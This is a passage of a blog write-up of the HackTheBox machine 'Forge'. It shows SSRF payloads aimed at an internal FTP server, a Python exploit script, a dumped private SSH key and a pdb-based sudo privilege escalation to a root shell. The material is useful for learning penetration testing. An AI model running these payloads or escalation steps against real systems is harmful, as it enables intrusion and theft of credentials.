    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/static/css/main.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/static/css/announcements.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;header&gt;</span>
            <span class="nt">&lt;nav&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">""</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Portal home<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right margin-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/announcements"</span><span class="nt">&gt;</span>Announcements<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/upload"</span><span class="nt">&gt;</span>Upload image<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
            <span class="nt">&lt;/nav&gt;</span>
    <span class="nt">&lt;/header&gt;</span>
    <span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
    <span class="nt">&lt;ul&gt;</span>
        <span class="nt">&lt;li&gt;</span>An internal ftp server has been setup with credentials as user:heightofsecurity123!<span class="nt">&lt;/li&gt;</span>
        <span class="nt">&lt;li&gt;</span>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.<span class="nt">&lt;/li&gt;</span>
        <span class="nt">&lt;li&gt;</span>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=<span class="ni">&amp;lt;</span>url<span class="ni">&amp;gt;</span>.<span class="nt">&lt;/li&gt;</span>
    <span class="nt">&lt;/ul&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span> 
</pre></table></code></div></div><p>We now have some credentials to an internal FTP server</p><pre><code class="language-txt">user:heightofsecurity123!
</code></pre><p>and also a tutorial on how to upload file on the admin subdomain using the <code class="language-plaintext highlighter-rouge">/upload</code> endpoint.</p><p>admin.forge.htb/upload</p><div class="language-html highlighter-rouge"><div class="code-header"> <span text-data=" HTML "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Upload an image<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"show_upload_local_file()"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/static/css/main.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"/static/css/upload.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"/static/js/main.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;header&gt;</span>
            <span class="nt">&lt;nav&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">""</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Portal home<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right margin-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/announcements"</span><span class="nt">&gt;</span>Announcements<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"align-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/upload"</span><span class="nt">&gt;</span>Upload image<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
            <span class="nt">&lt;/nav&gt;</span>
    <span class="nt">&lt;/header&gt;</span>
    <span class="nt">&lt;center&gt;</span>
        <span class="nt">&lt;br&gt;&lt;br&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"content"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;h2</span> <span class="na">onclick=</span><span class="s">"show_upload_local_file()"</span><span class="nt">&gt;</span>
                Upload local file
            <span class="nt">&lt;/h2&gt;</span>
            <span class="nt">&lt;h2</span> <span class="na">onclick=</span><span class="s">"show_upload_remote_file()"</span><span class="nt">&gt;</span>
                Upload from url
            <span class="nt">&lt;/h2&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"form-div"</span><span class="nt">&gt;</span>
                
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/center&gt;</span>
    <span class="nt">&lt;br&gt;</span>
    <span class="nt">&lt;br&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span> 
</pre></table></code></div></div><p>Through the SSRF on the main domain, we can upload a file on the <code class="language-plaintext highlighter-rouge">/upload</code> endpoint of <code class="language-plaintext highlighter-rouge">admin.forge.htb</code>, doing so result in the main domain giving us a response containing the response of <code class="language-plaintext highlighter-rouge">admin.forge.htb</code> telling us the file has been uploaded correctly and a path is diplayed.</p><p><code class="language-plaintext highlighter-rouge">url=http://admin.Forge.htb/upload?u=http://10.10.14.70:8000/poc.php&amp;remote=1</code></p><p>Even though this little trick is fun, it is not useful.</p><p>We can access the internal ftp server through the endpoint :</p><p><code class="language-plaintext highlighter-rouge">url=http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Forge.htb&amp;remote=1</code></p><p>Python script to automate ssrf payload</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">cmd</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="k">def</span> <span class="nf">send_ssrf</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>

    <span class="n">url</span> <span class="o">=</span> <span class="s">'http://forge.htb/upload'</span>
    <span class="n">ftp</span> <span class="o">=</span> <span class="s">'http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
    
    <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'url'</span><span class="p">:</span><span class="n">ftp</span><span class="p">,</span> <span class="s">'remote'</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span><span class="s">'html.parser'</span><span class="p">)</span>
    <span class="n">response_url</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">'a'</span><span class="p">)[</span><span class="mi">2</span><span class="p">].</span><span class="n">contents</span>
    
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">response_url</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>


<span class="k">class</span> <span class="nc">Exploit</span><span class="p">(</span><span class="n">cmd</span><span class="p">.</span><span class="n">Cmd</span><span class="p">):</span>
    <span class="n">prompt</span> <span class="o">=</span> <span class="s">'ftp &gt; '</span>
    <span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">arg</span><span class="p">):</span>
        <span class="n">send_ssrf</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">do_exit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">arg</span><span class="p">):</span>
        <span class="nb">exit</span><span class="p">()</span>

<span class="n">Exploit</span><span class="p">().</span><span class="n">cmdloop</span><span class="p">()</span>
</pre></table></code></div></div><p>The result diplayed is the directory served by the ftp server</p><pre><code class="language-txt">ftp &gt; /
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 1000     1000           33 Nov 29 20:26 user.txt
</code></pre><h2 id="initial-foothold">Initial Foothold</h2><p>We have to understand that this is a HOME FOLDER and we can’t see hidden directories like <code class="language-plaintext highlighter-rouge">.ssh</code>, but if we request it….we find the private key pair.</p><pre><code class="language-txt">python3 ssrf_exploit.py
ftp &gt; /.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----

</code></pre><p>The private key does not have a passphrase, we can connect to the server</p><p><code class="language-plaintext highlighter-rouge">ssh user@forge.htb -i id_rsa</code></p><h2 id="local-privilege-escalation">Local Privilege Escalation</h2><p>Now we need to find a way to escalate our privilege to <code class="language-plaintext highlighter-rouge">root</code> user.</p><p>The command <code class="language-plaintext highlighter-rouge">sudo -l</code> gives us a very interesting result.</p><pre><code class="language-txt">Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
</code></pre><p>/opt/remote-manager.py (-rwxr-xr-x 1 root root)</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">pdb</span>

<span class="n">port</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1025</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Listening on localhost:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
    <span class="p">(</span><span class="n">clientsock</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
    <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Enter the secret passsword: '</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">clientsock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span> <span class="o">!=</span> <span class="s">'secretadminpassword'</span><span class="p">:</span>
        <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Wrong password!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Welcome admin!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">What do you wanna do: </span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[1] View processes</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[2] View free memory</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[3] View listening sockets</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[4] Quit</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">option</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">clientsock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">strip</span><span class="p">())</span>
            <span class="k">if</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'ps aux'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'df'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'ss -lnt'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Bye</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
                <span class="k">break</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="n">pdb</span><span class="p">.</span><span class="n">post_mortem</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">__traceback__</span><span class="p">)</span>
<span class="k">finally</span><span class="p">:</span>
    <span class="n">quit</span><span class="p">()</span>
</pre></table></code></div></div><p>This script will create a socket listening on 127.0.0.1 with a random port, and after connecting to it, it will ask for a password and if the password is right, access some commands.</p><p>An interesting module used here is <code class="language-plaintext highlighter-rouge">pdb</code>. This module is the Python Debugger and is used to…well…debug program.</p><p>If we submit an error somewhere in the program, the <code class="language-plaintext highlighter-rouge">except</code> will trigger and we will have access to the debugger command line.</p><p>When the program asks for a choice, it is not veryfing our input and thus we can send something the program is not expecting.</p><p>Now that we have access to the Pdb command line, looking at the document here :</p><p><a href="https://docs.python.org/3/library/pdb.html">https://docs.python.org/3/library/pdb.html</a></p><p>We see the <code class="language-plaintext highlighter-rouge">p</code> command</p><p>This command will exec the expression we input.</p><pre><code class="language-txt">p expression
Evaluate the expression in the current context and print its value
</code></pre><p>We can execute shell command by using the <code class="language-plaintext highlighter-rouge">subprocess</code> module.</p><pre><code class="language-txt">(Pdb) p subprocess.run(["whoami"])
root
(Pdb) p subprocess.run(["bash"])
root@forge:/home/user# cat /root/root.txt
REDACTED
</code></pre><p>We are now root.</p><h2 id="conclusion">Conclusion</h2><p>This machine was very interesting, and made me practice some python scripting and learning new web vulnerability. The difficulty was fair and I hope to find more machines like that.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >medium</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Forge [HTB] - Vx86 Cybersec&url=https://vx86.github.io/posts/forge/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Forge [HTB] - Vx86 Cybersec&u=https://vx86.github.io/posts/forge/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Forge [HTB] - Vx86 Cybersec&url=https://vx86.github.io/posts/forge/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/solar/">Solar, exploiting log4j [THM]</a><li><a href="/posts/nibbles/">Nibbles [HTB]</a><li><a href="/posts/helloworld/">Hello World</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/log4j/">log4j</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/windows/">windows</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/nibbles/"><div class="card-body"> <span class="timeago small" >Dec 17, 2021<i class="unloaded">2021-12-17T00:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Nibbles [HTB]</h3><div class="text-muted small"><p> Nibbles With the goal of taking the OSCP exam next year, I started my journey of pentesting machines from HackTheBox using the TJNull’s TryHarder machine list. Nibbles is is the first in a lon...</p></div></div></a></div><div class="card"> <a href="/posts/valentine/"><div class="card-body"> <span class="timeago small" >Dec 22, 2021<i class="unloaded">2021-12-22T18:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Valentine [HTB]</h3><div class="text-muted small"><p> Valentine Valentine is an easy linux machine on HackTheBox. It is the third box in the OSCP learning series. Let’s not waste more time and start right away. Reconnaissance We start with the us...</p></div></div></a></div><div class="card"> <a href="/posts/grandpa/"><div class="card-body"> <span class="timeago small" >Dec 18, 2021<i class="unloaded">2021-12-18T17:45:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Grandpa [HTB]</h3><div class="text-muted small"><p> Grandpa Grandpa is an easy windows machine available on HackTheBox and is the second box I chose in the OSCP learning series. Let’s dive into it. Reconnaissance Starting with the usual TCP por...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/valentine/" class="btn btn-outline-primary" prompt="Older"><p>Valentine [HTB]</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Vx86</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/log4j/">log4j</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/windows/">windows</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result 